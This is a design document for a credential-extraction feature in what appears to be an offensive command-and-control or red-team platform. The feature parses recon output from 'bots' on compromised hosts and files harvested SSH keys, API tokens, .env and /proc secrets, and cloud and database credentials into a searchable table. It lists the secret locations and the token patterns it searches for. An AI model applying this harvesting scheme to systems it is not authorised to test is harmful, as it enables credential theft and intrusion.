# Recon Credential Extraction Design

Automatically parse recon campaign output and extract structured secrets into the credentials table with categories.

## Problem

Recon campaign output contains SSH private keys, API tokens, .env secrets, DB connection strings, and cloud credentials buried in raw text. Operators must manually read through walls of output to find actionable secrets. Nothing is searchable, filterable, or integrated with the credentials workflow.

## Solution

Extend the credentials table with a `category` field and a recon output parser that extracts structured secrets from the known `=== SECTION ===` headers our recon modules produce. Secrets are auto-inserted into the credentials table on recon task completion, with an optional manual extraction endpoint.

## Database Changes

Migration `012_credential_categories.sql`:

```sql
ALTER TABLE credentials ALTER COLUMN password TYPE TEXT;
ALTER TABLE credentials ADD COLUMN IF NOT EXISTS category VARCHAR(50) DEFAULT 'login';
ALTER TABLE credentials ADD COLUMN IF NOT EXISTS campaign_id UUID REFERENCES campaigns(id) ON DELETE SET NULL;
ALTER TABLE credentials ADD COLUMN IF NOT EXISTS source_path VARCHAR(500);
DROP INDEX IF EXISTS idx_credentials_unique;
CREATE UNIQUE INDEX IF NOT EXISTS idx_credentials_unique ON credentials (username, target, port, service, category);
```

**Categories:** `login`, `ssh_key`, `api_key`, `env_secret`, `db_connection`, `cloud_token`, `shell_history`, `misc`

Existing rows default to `category='login'`. No data migration needed.

## Recon Output Parser

New file: `internal/server/engine/recon_parser.go`

### Function Signature

```go
type ParsedSecret struct {
    Category   string
    Username   string // key name, variable name, or user
    Password   string // secret value (key content, token, password)
    Target     string // source host
    Port       int    // 0 for non-network secrets
    Service    string // "recon" for extracted secrets
    SourcePath string // file path where found
    BotID      string
    CampaignID string
}

func ParseReconSecrets(output, botID, campaignID, sourceHost string) []ParsedSecret
```

### Parsing Rules

| Section Header | Category | Extraction Logic |
|---|---|---|
| `=== SSH PRIVATE KEYS ===` | `ssh_key` | Split on `--- /path/to/key ---` markers. Each key block = one credential. `username` = key owner from path (e.g. `ubuntu` from `/home/ubuntu/.ssh/id_ed25519`). `source_path` = file path. `password` = full key content. |
| `=== HISTORY SECRETS ===` | `shell_history` | Regex scan for known token patterns: `sk-ant-`, `sk-or-`, `sk-proj-`, `nvapi-`, `ghp_`, `glpat-`, `xoxb-`, `Bearer `. Also match `KEY=value` and `KEY="value"` assignments where KEY contains `key`, `secret`, `token`, `password`, `api` (case-insensitive). `username` = variable/key name, `password` = token value. |
| `=== ENV FILES ===` | `env_secret` | Parse `KEY=VALUE` lines from .env file contents. Filter for lines where KEY contains `key`, `secret`, `token`, `password`, `api` (case-insensitive). Skip comments and empty lines. `username` = KEY, `password` = VALUE (strip quotes). `source_path` = .env file path from `--- /path/.env ---` marker. |
| `=== DB CONNECTION STRINGS ===` | `db_connection` | Regex for `protocol://user:pass@host:port/db` patterns (postgres://, mysql://, mongodb://, redis://). `username` = parsed user, `password` = parsed pass, `target` = host, `port` = parsed port, `service` = protocol. |
| `=== /proc ENV LEAKS ===` | `env_secret` | Same KEY=VALUE parsing as env files. Source path = `/proc/<pid>/environ` extracted from `(from /proc/<pid>/environ)` markers. |
| `=== WORDPRESS CONFIG ===` | `db_connection` | Parse PHP `define('DB_USER', ...)`, `define('DB_PASSWORD', ...)`, `define('DB_HOST', ...)`, `define('DB_NAME', ...)`. Combine into one credential. |
| `=== GCP CREDS ===` | `cloud_token` | Extract JSON key file content or token values. `username` = `gcp_credential`. |
| `=== AWS CONFIG ===` | `cloud_token` | Parse `aws_access_key_id` and `aws_secret_access_key` from INI format. `username` = access key ID, `password` = secret key. |
| `=== AZURE TOKEN ===` | `cloud_token` | Extract bearer token. `username` = `azure_token`. |
| `=== K8S SECRETS ===` | `cloud_token` | Extract decoded secret values. `username` = secret name. |
| `=== BROWSER CREDS ===` | `login` | Best-effort parse of structured output. Falls back to `misc` if unrecognized format. |
| `=== PROCESS CMDLINES ===` | `misc` | Scan for `--password`, `--token`, `--key`, `-p` flags followed by values in command lines. `username` = flag name, `password` = value. |
| All other sections | skipped | sysinfo, network, users, software, containers, internal_network, privesc, lateral_targets, persistence_check, process_inspect output is informational, not secret extraction targets. |

### Deduplication

Insert with `ON CONFLICT (username, target, port, service, category) DO NOTHING`. Same secret from multiple recon runs won't create duplicates.

## Engine Integration

In `internal/server/engine/engine.go`, after a recon campaign task completes with output:

```go
if campaign.Type == "recon" && taskStatus == "completed" {
    secrets := ParseReconSecrets(output, botID, campaignID, hostname)
    inserted := bulkInsertSecrets(secrets)
    log.Printf("[recon] extracted %d secrets from %s (%d new)", len(secrets), hostname, inserted)
}
```

**Auto-extract control:** Campaign config JSON gains an optional `auto_extract` boolean field. Default `true`. When `false`, the engine skips parsing. Checked via:

```go
type reconConfig struct {
    Modules     []string `json:"modules"`
    AutoExtract *bool    `json:"auto_extract,omitempty"` // nil = true (default)
}
```

**Brute campaigns unchanged.** They continue using the existing `CRED_FOUND:` parser with `category='login'`.

## Manual Extract Endpoint

`POST /api/v1/campaigns/:id/extract`

- Requires operator auth + writeGuard
- Fetches all completed recon tasks for the campaign
- Runs `ParseReconSecrets` on each task's output
- Inserts results with dedup
- Works regardless of `auto_extract` setting
- Response: `{"extracted": 14, "new": 8, "duplicates": 6}`
- Returns 400 if campaign type is not `recon`

Registered in server.go under the campaigns route group:
```go
camps.Post("/:id/extract", writeGuard, auditAction("campaign.extract", "campaign"), campHandler.ExtractSecrets)
```

## Dashboard Changes

### Credentials Tab

**Category filter bar** at top of page:

```
ALL | LOGIN | SSH_KEY | API_KEY | ENV_SECRET | DB_CONNECTION | CLOUD_TOKEN | SHELL_HISTORY | MISC
```

- Toggle buttons, ALL active by default
- Clicking a category filters the table client-side (no API call)
- Active filter highlighted with accent border
- Multiple categories cannot be selected simultaneously (radio-style, not checkboxes)

**Table columns** (updated):

| Column | Content |
|---|---|
| Category | Colored badge. Colors: login=red, ssh_key=cyan, api_key=yellow, env_secret=green, db_connection=purple, cloud_token=orange, shell_history=gray, misc=white |
| Target | IP/hostname or source host for recon secrets |
| Service | Uppercase badge |
| Username | Key name, variable name, or login username |
| Value | Masked by default. For `ssh_key`: shows `[SSH KEY - {size}]`. For others: masked dots. REVEAL button fetches plaintext. |
| Source | `source_path` truncated to filename, full path as title attribute. `-` if empty. |
| Valid | Badge (VALID/INVALID) |
| Discovered | timeAgo format |
| Actions | REVEAL + DELETE buttons (if canEdit) |

**Header rename:** "Password" column header becomes "Value".

### Campaign Results Page

Add "EXTRACT SECRETS" button alongside existing export buttons (JSON, HTML, MD):

- Only visible when campaign type is `recon`
- Calls `POST /campaigns/:id/extract`
- Shows result count in a flash message: `"Extracted 14 secrets (8 new, 6 duplicates)"`
- Button text changes to "RE-EXTRACT" after first use

### Overview Page

No changes. The "Valid Credentials" stat card automatically includes extracted secrets via the existing COUNT query.

## Files

| File | Action | Description |
|---|---|---|
| `migrations/012_credential_categories.sql` | Create | Schema changes |
| `internal/server/engine/recon_parser.go` | Create | Parser with per-section extraction rules |
| `internal/server/engine/engine.go` | Modify | Call parser after recon task completion |
| `internal/server/handlers/campaign.go` | Modify | Add ExtractSecrets handler |
| `internal/server/handlers/credential.go` | Modify | Include category, source_path, campaign_id in list/submit |
| `internal/server/server.go` | Modify | Register extract route |
| `pkg/models/credential.go` | Modify | Add Category, CampaignID, SourcePath fields |
| `web/dashboard/js/app.js` | Modify | Category filters, updated table, extract button |
| `web/dashboard/index.html` | Modify | Cache buster increment |

## Not Changing

- Brute campaign credential flow (CRED_FOUND parser)
- Existing API response contracts (new fields are additive)
- Credential reveal/delete endpoints (work unchanged)
- Agent code (recon output format stays the same)
